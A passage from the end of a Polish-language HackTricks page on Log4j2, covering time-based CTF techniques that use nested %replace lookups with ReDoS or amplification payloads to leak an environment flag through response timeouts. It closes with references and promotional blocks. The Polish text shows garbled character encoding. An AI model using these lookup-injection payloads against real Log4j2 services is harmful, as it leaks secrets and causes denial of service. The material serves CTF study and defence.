# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **Oparte na czasie**

Jak wspomniano wczeniej, **`%replace`** obsuguje **wyra偶enia regularne**. Dlatego mo偶liwe jest u偶ycie payloadu z [**strony ReDoS**](../regular-expression-denial-of-service-redos.md), aby spowodowa **przekroczenie czasu** w przypadku znalezienia flagi.\
Na przykad payload `%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}` spowoduje **przekroczenie czasu** w tej CTF.

W tym [**rozwizaniu**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) zamiast ataku ReDoS u偶yto **ataku amplifikacji**, aby spowodowa r贸偶nic czasu w odpowiedzi:

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> Jeli flaga zaczyna si od `flagGuess`, caa flaga zostanie zastpiona przez 29 znak贸w `#` (u偶yem tego znaku, poniewa偶 prawdopodobnie nie bdzie czci flagi). **Ka偶de z tych 29 znak贸w `#` zostaje nastpnie zastpione przez 54 znaki `#`**. Ten proces jest powtarzany **6 razy**, co daje cznie ` 29*54*54^6* =`` `` `**`96816014208`  `#`-s!**
>
> Zastpienie tak wielu znak贸w `#` spowoduje przekroczenie 10-sekundowego limitu czasu aplikacji Flask, co z kolei spowoduje wysanie kodu stanu HTTP 500 do u偶ytkownika. (Jeli flaga nie zaczyna si od `flagGuess`, otrzymamy kod stanu innego ni偶 500)

## Odwoania

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Znajduj podatnoci, kt贸re maj najwiksze znaczenie, aby m贸g je szybko naprawi. Intruder ledzi twoj powierzchni ataku, wykonuje proaktywne skanowanie zagro偶e, znajduje problemy w caym stosie technologicznym, od interfejs贸w API po aplikacje internetowe i systemy chmurowe. [**Wypr贸buj go za darmo**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) ju偶 dzi.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
